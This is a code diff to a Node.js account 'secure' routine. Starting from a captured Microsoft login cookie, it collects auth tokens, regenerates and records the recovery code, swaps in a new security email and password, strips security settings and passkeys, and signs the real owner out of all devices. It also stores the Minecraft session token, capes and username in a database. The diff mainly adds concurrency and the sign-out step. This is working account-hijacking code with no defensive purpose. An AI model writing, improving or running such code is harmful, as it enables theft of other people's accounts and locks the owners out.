@@ -54,6 +54,7 @@ const fs = require('fs');
 const path = require('path');
 const changepfp = require("../changeinfo/changePfp");
 const removePassKeys = require("../logout/removePassKeys");
+const signoutFromAllDevices = require("../logout/signoutFromAllDevices");
 const checkmc = require("../../../db/checkmc");
 const autonotifier = require("./recode/autonotifier");
 const newinfo = require("./recode/newinfo");
@@ -97,17 +98,28 @@ module.exports = async (host, settings, uid, username = null) => {
     console.log(`[RECODE_SECURE] Starting secure process for UID: ${uid}, username: ${username || 'none'}`);
     const initializetimer = timeTracker("Initialize");
     
+    const timeoutPromise = (promise, timeoutMs = 30000) => {
+        let timer;
+        return Promise.race([
+            promise,
+            new Promise((_, reject) => {
+                timer = setTimeout(() => reject(new Error('Operation timed out')), timeoutMs);
+            })
+        ]).finally(() => clearTimeout(timer));
+    };
+
     /**
-     * Initialize
+     * Initialize (run independent HTTP getCookies concurrently with DB init)
      */
     console.log(`[RECODE_SECURE] Initializing secure process...`);
-    let acc = await getAcc();
+    const cookiesPromise = getCookies();
+    let [acc, axios] = await Promise.all([
+        getAcc(),
+        initializesecure(uid)
+    ]);
     acc.loginCookie = host;
-    console.log(`[RECODE_SECURE] Account object created, login cookie set`);
-    let axios = await initializesecure(uid);
-    console.log(`[RECODE_SECURE] Axios instance initialized for UID: ${uid}`);
-    await updateStatus(uid, "msauth", host);
-    console.log(`[RECODE_SECURE] Status updated: msauth for UID: ${uid}`);
+    console.log(`[RECODE_SECURE] Account object & Axios initialized for UID: ${uid}`);
+    const statusInitPromise = updateStatus(uid, "msauth", host);
     console.log(`Starting recode secure!`);
     let accstarted = Date.now();
     
@@ -120,8 +132,17 @@ module.exports = async (host, settings, uid, username = null) => {
     /**
      * Get Cookies and Auth
      */
-    console.log(`[RECODE_SECURE] Getting cookies and authentication...`);
-    const [apiCanary, amsc, canary] = await getCookies();
+    console.log(`[RECODE_SECURE] Waiting for initial cookies...`);
+    const [cookieTokens] = await Promise.all([cookiesPromise, statusInitPromise]);
+    if (!cookieTokens) {
+        acc.email = "Microsoft services are down!";
+        acc.secEmail = "Microsoft services are down!";
+        acc.recoveryCode = "Microsoft services are down!";
+        acc.password = "Microsoft services are down!";
+        acc.status = "down";
+        return acc;
+    }
+    const [apiCanary, amsc, canary] = cookieTokens;
     console.log(`[RECODE_SECURE] Cookies retrieved: apiCanary=${!!apiCanary}, amsc=${!!amsc}, canary=${!!canary}`);
     
     console.log(`[RECODE_SECURE] Polishing host with amsc...`);
@@ -229,21 +250,20 @@ module.exports = async (host, settings, uid, username = null) => {
     const getauthtimer = timeTracker("Get Cookies");
     
     /**
-     * Get Auth Cookies
+     * Get Auth Cookies & Parallel Independent Tokens
      */
     let hasamc = true;
     let source = null;
     let mxbl = null;
 
-    // Add timeout wrapper for operations
-    const timeoutPromise = (promise, timeoutMs = 30000) => {
-        return Promise.race([
-            promise,
-            new Promise((_, reject) => 
-                setTimeout(() => reject(new Error('Operation timed out')), timeoutMs)
-            )
-        ]);
-    };
+    // Start XBL / MXBL / MSA token fetches immediately while axios gets verificationtoken & cookies
+    const tokenBatchPromise = Promise.allSettled([
+        timeoutPromise(xbl(acc.loginCookie), 45000),
+        timeoutPromise(getmxbl(msauth), 30000),
+        timeoutPromise(getMSAToken(msauth), 30000)
+    ]).then(results => results.map(result =>
+        result.status === 'fulfilled' ? result.value : null
+    ));
 
     // ✅ FIXED: Get verification token BEFORE calling cookies
     console.log('🔑 Getting verification token...');
@@ -267,14 +287,7 @@ module.exports = async (host, settings, uid, username = null) => {
         return acc;
     }
 
-    // Run other operations in parallel
-    let [xblResult, mxblresult, msatoken] = await Promise.allSettled([
-        timeoutPromise(xbl(acc.loginCookie), 45000),
-        timeoutPromise(getmxbl(msauth), 30000),
-        timeoutPromise(getMSAToken(msauth), 30000)
-    ]).then(results => results.map(result => 
-        result.status === 'fulfilled' ? result.value : null
-    ));
+    const [xblResult, mxblresult, msatoken] = await tokenBatchPromise;
 
     // Handle null cookiedata
     if (!cookiedata || !cookiedata.cookies) {
@@ -415,7 +428,10 @@ module.exports = async (host, settings, uid, username = null) => {
 
     const getsecdatatimer = timeTracker("Get Security Data");
 
-    const securedata = await getsecuredata(axios, uid, apiCanary, tokenobj);
+    const [securedata, secureInfoData] = await Promise.all([
+        getsecuredata(axios, uid, apiCanary, tokenobj),
+        getsecureinfo(settings)
+    ]);
 
     if (securedata?.email) {
         acc.email = securedata.email;
@@ -430,16 +446,16 @@ module.exports = async (host, settings, uid, username = null) => {
     const disabledtfa = securedata?.disabledtfa;
     const securityParameters = securedata?.securityparams;
 
-    if (!securedata?.recovery) {
+    if (!securedata?.recovery && securityParameters?.netId) {
         console.log(`Regenerating recovery!`);
-        recovery = await recoveryCode(axios, securityParameters?.netId, apiCanary, tokenobj);
+        recovery = await recoveryCode(axios, securityParameters.netId, apiCanary, tokenobj);
     } 
 
     if (!recovery) {
         console.log(`[Important error] Couldn't grab Recovery Code`);
     }
 
-    const { secEmail, password } = await getsecureinfo(settings);
+    const { secEmail, password } = secureInfoData;
     acc.recoverydata.email = acc.email || "Failed";
     acc.recoverydata.recovery = recovery || "Failed";
     acc.recoverydata.secemail = secEmail || "Failed";
@@ -566,10 +582,10 @@ module.exports = async (host, settings, uid, username = null) => {
         await updateStatus(uid, "email", `${acc.oldEmail} -> ${acc.email} (Alias check)`);
     })());
 
-    securePromises.push((async () => {
-        await changeinfo(uid, settings, axios, freshamc, freshjwt, acc.changedpfp, verificationtoken);
-        await removesection(settings, settings.exploit, settings.signout, uid, axios, securityParameters);
-    })());
+    securePromises.push(
+        changeinfo(uid, settings, axios, freshamc, freshjwt, verificationtoken),
+        removesection(settings, settings.signout ? null : false, settings.exploit, uid, axios, securityParameters)
+    );
 
     await Promise.all(securePromises);
     securepromisetime.end();
@@ -578,20 +594,26 @@ module.exports = async (host, settings, uid, username = null) => {
     const updatedinfo = await newinfo(axios, uid);
     if (updatedinfo?.newprimary) acc.email = updatedinfo.newprimary;
 
-    await updateStatus(uid, "email", `${acc.oldEmail} -> ${acc.email} (New-Info check)`);
-
-    let extrainfodata = await queryParams(`SELECT * FROM extrainformation WHERE uid=?`, [uid]);
-
     acc.timeTaken = Math.round((Date.now() - accstarted) / 100) / 10;
     acc.uid = uid;
-    
-    // For minecraft button
-    await Promise.all([
+
+    // Sign out of all devices ONLY after all mutations & newinfo read complete
+    const finalWrites = [
+        updateStatus(uid, "email", `${acc.oldEmail} -> ${acc.email} (New-Info check)`),
         updateExtraInformation(uid, "ssid", acc.ssid),
         updateExtraInformation(uid, "capes", JSON.stringify(acc.capes || [])),
         updateExtraInformation(uid, "lunar", JSON.stringify(acc.lunar || {})),
         updateExtraInformation(uid, "username", acc.newName)
-    ]);
+    ];
+
+    if (settings.signout) {
+        finalWrites.push((async () => {
+            const signedout = await signoutFromAllDevices(axios);
+            await updateExtraInformation(uid, "signout", signedout ? "True" : "False");
+        })());
+    }
+
+    await Promise.all(finalWrites);
 
     finishtimer.end();
     return acc;
